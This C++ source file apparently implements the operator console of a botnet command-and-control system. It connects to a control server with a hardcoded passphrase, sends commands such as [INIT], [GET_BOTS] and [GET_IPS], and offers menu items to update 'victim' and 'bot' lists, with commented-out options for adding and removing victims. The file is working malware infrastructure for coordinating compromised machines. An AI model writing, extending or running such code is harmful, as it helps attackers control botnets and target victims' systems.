#include "manager.h"

manager::manager(io::io_context& io_context, std::uint16_t port, std::string server_ip, std::uint16_t server_port)
    : io_context_(io_context),
      acceptor_(io_context, tcp::endpoint(tcp::v4(), port)),
      server_ip_(server_ip),
      server_port_(server_port) {
	passphrase_ = "flk23f9f_f=fsd";

	command_handlers_ = {
	    {"[ARE_YOU_ALIVE]",
	     boost::bind(&manager::handleAlive, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[INIT]",
	     boost::bind(&manager::handleInit, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[GET_BOTS]", boost::bind(&manager::handleGetBots, this, boost::placeholders::_1, boost::placeholders::_2,
				       boost::placeholders::_3)},
	    {"[GET_IPS]", boost::bind(&manager::handleGetIps, this, boost::placeholders::_1, boost::placeholders::_2,
				      boost::placeholders::_3)},
	};
	interactive_.menu_handlers_ = {
	    {"* Update victim list", boost::bind(&manager::getIps, this)},
	    {"* Update bot list", boost::bind(&manager::getBots, this)},
	    // {"Remove bot", boost::bind(&manager::removeBot, this)},
	    // {"Remove victim", boost::bind(&manager::removeIp, this)},
	    // {"Add victim", boost::bind(&manager::addIp, this)},
	};
}

void manager::start() {
	tcp::socket socket(io_context_);
	socket_ = std::move(socket);

	err error;
	tcp::endpoint endpoint(io::ip::make_address(server_ip_), server_port_);

	socket_->connect(endpoint, error);

	auto server = server_session_container_.emplace_back(std::make_shared<session>(std::move(*socket_), io_context_, 1));
	server->start(boost::bind(&manager::handleResponse, this, boost::placeholders::_1, boost::placeholders::_2));

	std::vector<std::string> output_params = {passphrase_};
	std::string command = "[INIT]";
	server->send(msg_parser_.genCommand(command, output_params));
	server->read();
}

void manager::handleResponse(std::string& query, session* manager) {
	auto parsed_msg = msg_parser_.parse_msg(query);

	if (parsed_msg["is_valid_msg"][0] == "false") {
		return;
	}
	auto handler = command_handlers_.find(parsed_msg["command"][0])->second;
	if (handler) handler(parsed_msg["command"][0], parsed_msg["params"], manager);
}

void manager::handleAlive(std::string& command, std::vector<std::string>& params, session* server) {
	std::vector<std::string> output_params = {"1"};
	server->send(msg_parser_.genCommand(command, output_params));
}

void manager::handleInit(std::string& command, std::vector<std::string>& params, session* server) {
	if (!params.size()) return;
	if (stoi(params[0])) {
		ui_start_ = std::async(std::launch::async, &user_interface::start, &interactive_);
	}
}

void manager::handleGetBots(std::string& command, std::vector<std::string>& params, session* server) {
	if (!params.size()) return;
	interactive_.updateBots(params);
}

void manager::handleGetIps(std::string& command, std::vector<std::string>& params, session* server) {
	if (!params.size()) return;
	interactive_.updateVictims(params);
}

void manager::getBots() {
	std::vector<std::string> output_params{passphrase_};
	std::string command = "[GET_BOTS]";
	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
}

void manager::getIps() {
	std::vector<std::string> output_params{passphrase_};
	std::string command = "[GET_IPS]";
	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
}